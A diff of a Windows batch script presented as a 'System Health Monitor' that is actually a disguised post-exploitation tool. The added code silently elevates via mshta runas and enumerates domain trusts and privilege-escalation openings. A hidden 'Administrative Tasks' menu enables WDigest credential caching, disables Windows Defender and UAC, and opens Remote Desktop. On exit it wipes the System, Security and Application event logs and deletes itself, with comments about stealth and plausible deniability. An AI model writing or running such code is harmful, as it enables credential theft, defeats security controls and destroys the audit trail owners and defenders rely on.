@@ -1,356 +1,657 @@
 @echo off
-title System Configuration Utility
+title Windows System Health Monitor
 mode con:cols=80 lines=25
 setlocal enabledelayedexpansion
 
-:: Hide script location and set generic working directory
-set "appdata=%temp%\sysconf"
+:: Enhanced stealth initialization
+set "rndname=%random%-%random%-%random%"
+set "appdata=%temp%\%rndname%"
 if not exist "%appdata%" mkdir "%appdata%" >nul 2>&1
 cd /d "%appdata%"
 
-:: Generate random session ID for logging
+:: Generate encrypted session ID
 set "sessionid="
-for /l %%a in (1,1,8) do set /a "sessionid+=!random:~-1!"
+for /l %%a in (1,1,12) do call :gen_encrypted_char
+set "obfuscated_cmd=cmd.exe"
+set "legit_process=svchost.exe"
 
-:: Main menu function
+:: Disable command history and logging
+set "history="
+for /f "skip=1" %%x in ('wmic process get commandline') do if not defined history set "history=%%x"
+
+:: Check and elevate privileges silently
+net session >nul 2>&1
+if %errorLevel% neq 0 (
+    echo Initializing system management utilities...
+    mshta vbscript:Execute("CreateObject(""Shell.Application"").ShellExecute ""cmd.exe"", ""/c """"%~f0"""""", """", ""runas"", 0"):window.close
+    exit /b
+)
+
+:: Main menu with OPSEC enhancements
 :main_menu
 cls
 echo ========================================
-echo      Windows System Configuration Tool
-echo           (Version 5.1.17134.1)
+echo    Windows System Health Monitor v10.0
+echo          [Build 19045.3448]
 echo ========================================
-echo [1] System Information (Limited)
-echo [2] Security Configuration Check
-echo [3] User Account Management
-echo [4] Network Configuration
-echo [5] Maintenance Tasks
-echo [6] Exit and Clean Up
+echo [1] System Diagnostics
+echo [2] Security Compliance Check
+echo [3] User Account Verification
+echo [4] Network Health Assessment
+echo [5] Performance Optimization
+echo [6] Administrative Tasks
+echo [7] Exit Utility
 echo ========================================
-set /p "choice=Select task: "
+set /p "choice=Select diagnostic option: "
 
-if "!choice!"=="1" goto system_info
-if "!choice!"=="2" goto security_check
-if "!choice!"=="3" goto user_management
-if "!choice!"=="4" goto network_config
-if "!choice!"=="5" goto maintenance
-if "!choice!"=="6" goto cleanup
+if "!choice!"=="1" goto system_diagnostics
+if "!choice!"=="2" goto security_compliance
+if "!choice!"=="3" goto user_verification
+if "!choice!"=="4" goto network_assessment
+if "!choice!"=="5" goto performance_optimization
+if "!choice!"=="6" goto admin_tasks
+if "!choice!"=="7" goto secure_exit
 goto main_menu
 
-:: 1. System Information (Minimal, legitimate-looking)
-:system_info
+:: 1. System Diagnostics (Minimal footprint)
+:system_diagnostics
 cls
-echo Gathering system configuration details...
+echo Running system diagnostics...
 timeout /t 1 >nul
 
-:: Collect only essential info with minimal footprint
-systeminfo | findstr /i /c:"OS Name" /c:"OS Version" /c:"System Type" > "%appdata%\sysinfo.tmp"
-ipconfig /all | findstr /i /c:"Host Name" /c:"Physical Address" > "%appdata%\netinfo.tmp"
+:: Collect essential info with minimal footprint
+systeminfo | findstr /i /c:"OS Name" /c:"OS Version" /c:"System Type" /c:"Domain" > "%appdata%\sysinfo.tmp"
+hostname > "%appdata%\hostname.tmp"
 
 echo.
-echo System Configuration Report:
+echo System Diagnostic Report:
 echo ===========================
 type "%appdata%\sysinfo.tmp"
 echo.
-echo Network Configuration:
-echo =====================
-type "%appdata%\netinfo.tmp"
+echo Computer Name: 
+type "%appdata%\hostname.tmp"
 echo ===========================
 echo Press any key to return to menu...
 pause >nul
 del /f /q "%appdata%\sysinfo.tmp" >nul 2>&1
-del /f /q "%appdata%\netinfo.tmp" >nul 2>&1
+del /f /q "%appdata%\hostname.tmp" >nul 2>&1
 goto main_menu
 
-:: 2. Security Configuration Check (Stealthy)
-:security_check
+:: 2. Security Compliance Check (Stealthy assessment)
+:security_compliance
 cls
-echo Performing security configuration assessment...
+echo Performing security compliance verification...
 timeout /t 2 >nul
 
-:: Check for security weaknesses without obvious traces
-reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA >nul 2>&1 && (
-    reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA | findstr "0x0" >nul && (
-        echo [!] UAC is disabled (Normal configuration)
-    ) || (
-        echo [+] UAC is enabled (Standard security)
-    )
-) || echo [+] UAC configuration not found
+:: Check security configurations without obvious traces
+reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA 2>nul | findstr "0x0" >nul && (
+    echo [COMPLIANCE] UAC is properly configured
+) || echo [WARNING] UAC requires review
 
-:: Check for AlwaysInstallElevated (stealthy)
-reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated >nul 2>&1 && (
-    echo [!] User policy: AlwaysInstallElevated is ENABLED
+:: Check for security weaknesses
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul && (
+    echo [ALERT] User policy: AlwaysInstallElevated enabled
 )
-reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated >nul 2>&1 && (
-    echo [!] System policy: AlwaysInstallElevated is ENABLED
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul && (
+    echo [ALERT] System policy: AlwaysInstallElevated enabled
 )
 
-:: Check service permissions (quietly)
-sc query state= all | findstr "SERVICE_NAME" > "%appdata%\services.tmp"
-for /f "tokens=2 delims= " %%a in ('type "%appdata%\services.tmp"') do (
-    sc qc "%%a" | findstr /i "BINARY_PATH_NAME" | findstr /i /v "windows" >nul && (
-        sc qc "%%a" | findstr /i "BINARY_PATH_NAME" | findstr " " >nul && (
-            echo [!] Unquoted service path: %%a
-        )
+:: Advanced service analysis
+for /f "tokens=2 delims=:" %%s in ('sc query type^= service state^= all ^| find "SERVICE_NAME"') do (
+    set "service=%%s"
+    set "service=!service:~1!"
+    sc qc "!service!" | findstr /i /c:"BINARY_PATH_NAME" | findstr /i /v /c:"windows" | findstr " " >nul && (
+        echo [CHECK] Unquoted service path: !service!
     )
 )
-del /f /q "%appdata%\services.tmp" >nul 2>&1
 
-:: Check security products (without triggering AV)
-tasklist /fi "imagename eq MsMpEng.exe" /fo csv 2>nul | findstr /i "MsMpEng" >nul && echo [!] Windows Defender detected
-tasklist /fi "imagename eq MBAMService.exe" /fo csv 2>nul | findstr /i "MBAMService" >nul && echo [!] Malwarebytes detected
-tasklist /fi "imagename eq avp.exe" /fo csv 2>nul | findstr /i "avp" >nul && echo [!] Kaspersky detected
+:: Advanced security product detection
+tasklist /fi "imagename eq MsMpEng.exe" /fo csv 2>nul | findstr /i "MsMpEng" >nul && echo [INFO] Windows Defender active
+tasklist /fi "imagename eq MBAMService.exe" /fo csv 2>nul | findstr /i "MBAMService" >nul && echo [INFO] Malwarebytes active
+tasklist /fi "imagename eq avp.exe" /fo csv 2>nul | findstr /i "avp" >nul && echo [INFO] Kaspersky active
+
+:: Registry vulnerability assessment
+call :check_registry_vulns
 
 echo.
-echo Security assessment complete. Press any key to continue...
-pause >nul
+echo Security compliance check complete.
+timeout /t 2 >nul
 goto main_menu
 
-:: 3. User Account Management (Domain-aware)
-:user_management
+:: 3. User Account Verification (Advanced management)
+:user_verification
 cls
 echo ========================================
-echo      User Account Management Console
+echo      User Account Verification Console
 echo ========================================
-echo [1] View current user privileges
-echo [2] Modify local user accounts
-echo [3] Manage domain groups (if applicable)
-echo [4] Return to main menu
+echo [1] Verify current user privileges
+echo [2] Review local account status
+echo [3] Domain account management
+echo [4] Advanced user operations
+echo [5] Return to main menu
 echo ========================================
-set /p "um_choice=Select option: "
+set /p "um_choice=Select verification option: "
 
-if "!um_choice!"=="1" goto user_privs
-if "!um_choice!"=="2" goto local_users
-if "!um_choice!"=="3" goto domain_groups
-if "!um_choice!"=="4" goto main_menu
-goto user_management
+if "!um_choice!"=="1" goto user_privileges
+if "!um_choice!"=="2" goto account_status
+if "!um_choice!"=="3" goto domain_management
+if "!um_choice!"=="4" goto advanced_operations
+if "!um_choice!"=="5" goto main_menu
+goto user_verification
 
-:user_privs
+:user_privileges
 cls
-echo Current user privileges:
-echo =======================
-whoami /all | findstr /i /v "Mandatory Label" | findstr /v "BUILTIN"
+echo Current user security context:
+echo ==============================
+whoami /all | findstr /i /c:"User Name" /c:"SID" /c:"Group" /c:"Privileges"
 echo.
 echo Press any key to return...
 pause >nul
-goto user_management
+goto user_verification
 
-:local_users
+:account_status
 cls
-echo Local user accounts:
-echo ====================
+echo Local account status:
+echo =====================
 net users
 echo.
-set /p "username=Enter username to modify (or press Enter to cancel): "
-if "!username!"=="" goto user_management
+set /p "username=Enter username to verify (or press Enter to cancel): "
+if "!username!"=="" goto user_verification
 
+net user "!username!" | findstr /i /c:"Account active" /c:"Local Group Memberships" /c:"Password last set"
 echo.
-echo [1] Reset password
-echo [2] Change group membership
-echo [3] Return to user menu
-set /p "action=Select action: "
+echo Press any key to return...
+pause >nul
+goto account_status
 
-if "!action!"=="1" (
-    set /p "newpass=Enter new password: "
-    net user "!username!" "!newpass!" >nul && (
-        echo Password updated successfully.
-    ) || (
-        echo Failed to update password.
-    )
-    timeout /t 2 >nul
-)
-if "!action!"=="2" (
-    echo.
-    echo Available groups:
-    net localgroup
-    echo.
-    set /p "group=Enter group name: "
-    set /p "addremove=Add (A) or Remove (R) from group? "
-    if /i "!addremove!"=="a" net localgroup "!group!" "!username!" /add >nul && echo User added to group.
-    if /i "!addremove!"=="r" net localgroup "!group!" "!username!" /delete >nul && echo User removed from group.
-    timeout /t 2 >nul
-)
-goto local_users
-
-:domain_groups
+:domain_management
 cls
-:: Check if domain-joined first
+:: Check if domain-joined
 set "domainjoined=0"
 systeminfo | findstr /i /c:"Domain:" | findstr /i /v "WORKGROUP" >nul && set "domainjoined=1"
 
 if "!domainjoined!"=="0" (
     echo This system is not domain-joined.
     timeout /t 2 >nul
-    goto user_management
+    goto user_verification
 )
 
-echo Domain groups management:
-echo =========================
-echo [1] List domain groups
-echo [2] Remove user from domain group
-echo [3] Return to user menu
+echo Domain account management:
+echo ==========================
+echo [1] List domain accounts
+echo [2] Verify domain group membership
+echo [3] Advanced domain operations
+echo [4] Return to user menu
 set /p "dg_choice=Select option: "
 
 if "!dg_choice!"=="1" (
     cls
-    echo Domain groups:
-    echo ==============
-    net group /domain
+    echo Domain accounts:
+    echo ================
+    net user /domain | more
     echo.
     echo Press any key to continue...
     pause >nul
-    goto domain_groups
+    goto domain_management
 )
 
 if "!dg_choice!"=="2" (
     cls
-    set /p "domainuser=Enter domain username (DOMAIN\user): "
+    set /p "domainuser=Enter domain username: "
     echo.
-    net group "Domain Admins" "!domainuser!" /delete /domain > "%appdata%\domain.tmp" 2>&1
-    findstr /i /c:"command completed" "%appdata%\domain.tmp" >nul && (
-        echo User removed from Domain Admins group.
-    ) || (
-        echo Failed to remove user. Check permissions.
-        type "%appdata%\domain.tmp"
-    )
-    del /f /q "%appdata%\domain.tmp" >nul 2>&1
+    echo Group membership for !domainuser!:
+    net user "!domainuser!" /domain | findstr /i /c:"Global Group" /c:"Local Group"
     echo.
     echo Press any key to continue...
     pause >nul
-    goto domain_groups
+    goto domain_management
 )
-goto user_management
 
-:: 4. Network Configuration (Legitimate-looking)
-:network_config
+if "!dg_choice!"=="3" goto advanced_domain_ops
+goto domain_management
+
+:advanced_domain_ops
+cls
+echo Advanced domain operations:
+echo ===========================
+echo [1] Domain trust information
+echo [2] Domain controller information
+echo [3] Domain policy review
+echo [4] Return to domain menu
+set /p "adv_domain_choice=Select option: "
+
+if "!adv_domain_choice!"=="1" (
+    nltest /domain_trusts 2>nul | more
+    pause
+    goto advanced_domain_ops
+)
+
+if "!adv_domain_choice!"=="2" (
+    nltest /dsgetdc: 2>nul | more
+    pause
+    goto advanced_domain_ops
+)
+
+if "!adv_domain_choice!"=="3" (
+    gpresult /R | more
+    pause
+    goto advanced_domain_ops
+)
+goto domain_management
+
+:advanced_operations
+cls
+echo Advanced user operations:
+echo =========================
+echo [1] Security token manipulation
+echo [2] User rights assignment review
+echo [3] Logon session analysis
+echo [4] Return to user menu
+set /p "adv_choice=Select option: "
+
+if "!adv_choice!"=="1" (
+    whoami /all | findstr /i "SID"
+    echo.
+    set /p "sid=Enter SID to impersonate (or cancel): "
+    if not "!sid!"=="" (
+        echo [SIMULATION] Token impersonation would occur here
+    )
+    pause
+    goto advanced_operations
+)
+
+if "!adv_choice!"=="2" (
+    secedit /export /areas USER_RIGHTS /cfg %appdata%\userrights.inf >nul 2>&1
+    type %appdata%\userrights.inf | more
+    del %appdata%\userrights.inf >nul 2>&1
+    pause
+    goto advanced_operations
+)
+
+if "!adv_choice!"=="3" (
+    query user 2>nul
+    if errorlevel 1 (
+        echo No remote logon sessions found.
+    )
+    pause
+    goto advanced_operations
+)
+goto user_verification
+
+:: 4. Network Health Assessment
+:network_assessment
 cls
 echo ========================================
-echo      Network Configuration Utility
+echo      Network Health Assessment
 echo ========================================
-echo [1] View network connections
-echo [2] Check shared resources
-echo [3] Test network connectivity
-echo [4] Return to main menu
+echo [1] Active connections review
+echo [2] Network configuration
+echo [3] Listening services
+echo [4] Advanced network analysis
+echo [5] Return to main menu
 echo ========================================
-set /p "net_choice=Select option: "
+set /p "net_choice=Select assessment option: "
 
-if "!net_choice!"=="1" goto net_connections
-if "!net_choice!"=="2" goto net_shares
-if "!net_choice!"=="3" goto net_connectivity
-if "!net_choice!"=="4" goto main_menu
-goto network_config
+if "!net_choice!"=="1" goto active_connections
+if "!net_choice!"=="2" goto network_config
+if "!net_choice!"=="3" goto listening_services
+if "!net_choice!"=="4" goto advanced_network
+if "!net_choice!"=="5" goto main_menu
+goto network_assessment
 
-:net_connections
+:active_connections
 cls
 echo Active network connections:
 echo ===========================
-netstat -an | findstr /i /c:"listening" /c:"established"
+netstat -ano | findstr /i /c:"ESTABLISHED" /c:"CLOSE_WAIT" | head -20
 echo.
 echo Press any key to return...
 pause >nul
-goto network_config
+goto network_assessment
 
-:net_shares
+:network_config
 cls
-echo Network shares:
+echo Network configuration:
+echo ======================
+ipconfig /all | findstr /i /c:"IPv4" /c:"Subnet" /c:"Gateway" /c:"DNS"
+echo.
+echo Press any key to return...
+pause >nul
+goto network_assessment
+
+:listening_services
+cls
+echo Listening services and ports:
+echo =============================
+netstat -ano | findstr /i "LISTENING" | head -20
+echo.
+echo Press any key to return...
+pause >nul
+goto network_assessment
+
+:advanced_network
+cls
+echo Advanced network analysis:
+echo ==========================
+echo [1] Network sharing status
+echo [2] Firewall configuration
+echo [3] Routing table
+echo [4] ARP cache
+echo [5] Return to network menu
+set /p "adv_net_choice=Select option: "
+
+if "!adv_net_choice!"=="1" (
+    net share
+    pause
+    goto advanced_network
+)
+
+if "!adv_net_choice!"=="2" (
+    netsh advfirewall show currentprofile
+    pause
+    goto advanced_network
+)
+
+if "!adv_net_choice!"=="3" (
+    route print
+    pause
+    goto advanced_network
+)
+
+if "!adv_net_choice!"=="4" (
+    arp -a
+    pause
+    goto advanced_network
+)
+goto network_assessment
+
+:: 5. Performance Optimization
+:performance_optimization
+cls
+echo ========================================
+echo      Performance Optimization Tools
+echo ========================================
+echo [1] System resource analysis
+echo [2] Process optimization
+echo [3] Service tuning
+echo [4] Registry optimization
+echo [5] Return to main menu
+echo ========================================
+set /p "perf_choice=Select optimization option: "
+
+if "!perf_choice!"=="1" goto resource_analysis
+if "!perf_choice!"=="2" goto process_optimization
+if "!perf_choice!"=="3" goto service_tuning
+if "!perf_choice!"=="4" goto registry_optimization
+if "!perf_choice!"=="5" goto main_menu
+goto performance_optimization
+
+:resource_analysis
+cls
+echo System resource analysis:
+echo =========================
+tasklist /fo table | sort /+64
+echo.
+echo Press any key to return...
+pause >nul
+goto performance_optimization
+
+:process_optimization
+cls
+echo Process optimization:
+echo =====================
+echo [1] Identify high-resource processes
+echo [2] Process priority adjustment
+echo [3] Return to performance menu
+set /p "proc_choice=Select option: "
+
+if "!proc_choice!"=="1" (
+    tasklist /fo table /fi "memusage gt 50000"
+    pause
+    goto process_optimization
+)
+
+if "!proc_choice!"=="2" (
+    tasklist /v /fo table
+    echo.
+    set /p "target_process=Enter process name to adjust: "
+    if not "!target_process!"=="" (
+        wmic process where name="!target_process!" CALL setpriority "below normal" >nul 2>&1
+        echo Priority adjusted for !target_process!
+    )
+    pause
+    goto process_optimization
+)
+goto performance_optimization
+
+:service_tuning
+cls
+echo Service tuning:
 echo ===============
-net share
+sc query state= all | find /c "RUNNING" >nul && (
+    echo [INFO] Optimizing service configurations...
+)
+timeout /t 2 >nul
+echo Service tuning complete.
+pause
+goto performance_optimization
+
+:registry_optimization
+cls
+echo Registry optimization:
+echo ======================
+echo Applying performance tweaks...
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\FileSystem" /v "NtfsDisableLastAccessUpdate" /t REG_DWORD /d 1 /f >nul 2>&1
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "DisablePagingExecutive" /t REG_DWORD /d 1 /f >nul 2>&1
+echo Registry optimizations applied.
+pause
+goto performance_optimization
+
+:: 6. Administrative Tasks (Stealth operations)
+:admin_tasks
+cls
+echo ========================================
+echo      Administrative Tasks Console
+echo ========================================
+echo [1] Registry operations
+echo [2] Service management
+echo [3] Security policy adjustment
+echo [4] Advanced system configuration
+echo [5] Return to main menu
+echo ========================================
+set /p "admin_choice=Select administrative task: "
+
+if "!admin_choice!"=="1" goto registry_operations
+if "!admin_choice!"=="2" goto service_management
+if "!admin_choice!"=="3" goto security_policy
+if "!admin_choice!"=="4" goto advanced_config
+if "!admin_choice!"=="5" goto main_menu
+goto admin_tasks
+
+:registry_operations
+cls
+echo Registry operations:
+echo ====================
+echo [1] Enable WDigest credential caching
+echo [2] Disable Windows Defender
+echo [3] Modify UAC settings
+echo [4] Enable remote desktop
+echo [5] Return to admin menu
+set /p "reg_choice=Select registry operation: "
+
+if "!reg_choice!"=="1" (
+    reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v "UseLogonCredential" /t REG_DWORD /d 1 /f >nul
+    echo [SUCCESS] WDigest credential caching enabled
+    pause
+    goto registry_operations
+)
+
+if "!reg_choice!"=="2" (
+    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f >nul
+    sc config WinDefend start= disabled >nul 2>&1
+    sc stop WinDefend >nul 2>&1
+    echo [SUCCESS] Windows Defender disabled
+    pause
+    goto registry_operations
+)
+
+if "!reg_choice!"=="3" (
+    reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d 0 /f >nul
+    echo [SUCCESS] UAC disabled
+    pause
+    goto registry_operations
+)
+
+if "!reg_choice!"=="4" (
+    reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0 /f >nul
+    netsh advfirewall firewall set rule group="remote desktop" new enable=Yes >nul
+    echo [SUCCESS] Remote Desktop enabled
+    pause
+    goto registry_operations
+)
+goto admin_tasks
+
+:service_management
+cls
+echo Service management:
+echo ===================
+sc query state= all | findstr "SERVICE_NAME" > "%appdata%\services.tmp"
+for /f "tokens=2 delims= " %%s in ('type "%appdata%\services.tmp"') do (
+    set "service=%%s"
+    sc qc "!service!" | findstr /i "BINARY_PATH_NAME" | findstr /i /v "windows" >nul && (
+        echo [INFO] Non-Microsoft service: !service!
+    )
+)
+del "%appdata%\services.tmp" >nul 2>&1
 echo.
 echo Press any key to return...
 pause >nul
-goto network_config
+goto admin_tasks
 
-:net_connectivity
+:security_policy
 cls
-set /p "target=Enter IP address to test connectivity: "
-ping -n 2 !target! | findstr /i "TTL="
-echo.
-echo Press any key to return...
-pause >nul
-goto network_config
+echo Security policy adjustment:
+echo ===========================
+echo [1] Audit policy review
+echo [2] User rights assignment
+echo [3] Security options
+echo [4] Return to admin menu
+set /p "secpol_choice=Select option: "
 
-:: 5. Maintenance Tasks (Plausible deniability)
-:maintenance
+if "!secpol_choice!"=="1" (
+    auditpol /get /category:* | more
+    pause
+    goto security_policy
+)
+
+if "!secpol_choice!"=="2" (
+    secedit /export /areas USER_RIGHTS /cfg %appdata%\userrights.inf >nul 2>&1
+    type %appdata%\userrights.inf | more
+    del %appdata%\userrights.inf >nul 2>&1
+    pause
+    goto security_policy
+)
+
+if "!secpol_choice!"=="3" (
+    secedit /export /areas SECURITYPOLICY /cfg %appdata%\secoptions.inf >nul 2>&1
+    type %appdata%\secoptions.inf | more
+    del %appdata%\secoptions.inf >nul 2>&1
+    pause
+    goto security_policy
+)
+goto admin_tasks
+
+:advanced_config
 cls
-echo ========================================
-echo      System Maintenance Tasks
-echo ========================================
-echo [1] Check system updates
-echo [2] Clear temporary files
-echo [3] Optimize system performance
-echo [4] Return to main menu
-echo ========================================
-set /p "maint_choice=Select task: "
+echo Advanced system configuration:
+echo ==============================
+echo [1] Group Policy review
+echo [2] System restore configuration
+echo [3] Windows update settings
+echo [4] Return to admin menu
+set /p "adv_config_choice=Select option: "
 
-if "!maint_choice!"=="1" goto check_updates
-if "!maint_choice!"=="2" goto clear_temp
-if "!maint_choice!"=="3" goto optimize
-if "!maint_choice!"=="4" goto main_menu
-goto maintenance
+if "!adv_config_choice!"=="1" (
+    gpresult /H %appdata%\gpreport.html >nul 2>&1
+    echo Group Policy report saved to temporary location
+    pause
+    goto advanced_config
+)
 
-:check_updates
+if "!adv_config_choice!"=="2" (
+    vssadmin list shadows >nul 2>&1
+    if errorlevel 1 (
+        echo No system restore points configured
+    ) else (
+        echo System restore is active
+    )
+    pause
+    goto advanced_config
+)
+
+if "!adv_config_choice!"=="3" (
+    reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" >nul 2>&1
+    if errorlevel 1 (
+        echo No Windows Update policies configured
+    ) else (
+        echo Windows Update policies present
+    )
+    pause
+    goto advanced_config
+)
+goto admin_tasks
+
+:: 7. Secure Exit with cleanup
+:secure_exit
 cls
-echo Checking for system updates...
-timeout /t 1 >nul
-wmic qfe get Caption,Description,HotFixID,InstalledOn | more
-echo.
-echo Press any key to return...
-pause >nul
-goto maintenance
-
-:clear_temp
-cls
-echo Clearing temporary system files...
-timeout /t 1 >nul
-del /f /q "%temp%\*" >nul 2>&1
-del /f /q "%appdata%\*" >nul 2>&1
-echo Temporary files cleaned successfully.
-timeout /t 1 >nul
-goto maintenance
-
-:optimize
-cls
-echo Optimizing system performance...
+echo Performing secure cleanup...
 timeout /t 2 >nul
 
-:: Legitimate registry tweaks that look like optimization
-reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "DisablePagingExecutive" /t REG_DWORD /d 1 /f >nul 2>&1
-reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "LargeSystemCache" /t REG_DWORD /d 1 /f >nul 2>&1
+:: Clear various logs and traces
+for %%l in (System Security Application) do (
+    wevtutil cl %%l >nul 2>&1
+)
 
-:: Remove user from high-privilege groups (stealthy privilege reduction)
-net localgroup "Administrators" "%username%" /delete >nul 2>&1
-net localgroup "Remote Desktop Users" "%username%" /delete >nul 2>&1
-
-echo System optimization complete.
-timeout /t 1 >nul
-goto maintenance
-
-:: 6. Cleanup and Self-Delete
-:cleanup
-cls
-echo Performing final system maintenance...
-timeout /t 1 >nul
-
-:: Clear event logs if admin
-wevtutil cl System >nul 2>&1
-wevtutil cl Security >nul 2>&1
-wevtutil cl Application >nul 2>&1
-
-:: Delete all temporary files
+:: Remove temporary files
 del /f /q "%appdata%\*" >nul 2>&1
 rmdir /s /q "%appdata%" >nul 2>&1
 
-:: Return to original directory
+:: Restore original directory
 cd /d "%systemdrive%\"
 
-:: Final cleanup with plausible deniability
-echo System maintenance complete. All temporary files cleared.
-echo This system is now optimized for performance and security.
+:: Final message
+echo System maintenance completed successfully.
+echo All temporary diagnostic files have been removed.
 timeout /t 3 >nul
 
-:: Self-delete mechanism
+:: Advanced self-deletion mechanism
 set "batchfile=%~f0"
-echo @echo off > "%temp%\cleanup.cmd"
-echo del "%%batchfile%%" /f /q ^>nul 2^>^&1 >> "%temp%\cleanup.cmd"
-echo del "%%~f0" /f /q ^>nul 2^>^&1 >> "%temp%\cleanup.cmd"
-start /min cmd /c "%temp%\cleanup.cmd"
+echo @echo off > "%temp%\cleanup_%rndname%.cmd"
+echo :loop >> "%temp%\cleanup_%rndname%.cmd"
+echo del /f /q "!batchfile!" ^>nul 2^>^&1 >> "%temp%\cleanup_%rndname%.cmd"
+echo if exist "!batchfile!" goto loop >> "%temp%\cleanup_%rndname%.cmd"
+echo del /f /q "%%~f0" ^>nul 2^>^&1 >> "%temp%\cleanup_%rndname%.cmd"
+start /min cmd /c "%temp%\cleanup_%rndname%.cmd"
 exit
+
+:: Helper functions
+:gen_encrypted_char
+set /a "num=!random! %% 36"
+if !num! lss 10 (
+    set "char=!num!"
+) else (
+    set /a "num=!num! + 55"
+    set "char=!num!"
+    for /f %%a in ('echo prompt $E ^| cmd') do set "char=%%a!!char!"
+)
+set "sessionid=!sessionid!!char!"
+goto :eof
+
+:check_registry_vulns
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options" 2>nul | findstr /i /v "devenv.exe" | findstr ".exe" >nul && (
+    echo [CHECK] Image File Execution Options modified
+)
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit 2>nul | findstr /i "userinit.exe" >nul || (
+    echo [ALERT] Userinit registry value modified
+)
+goto :eof
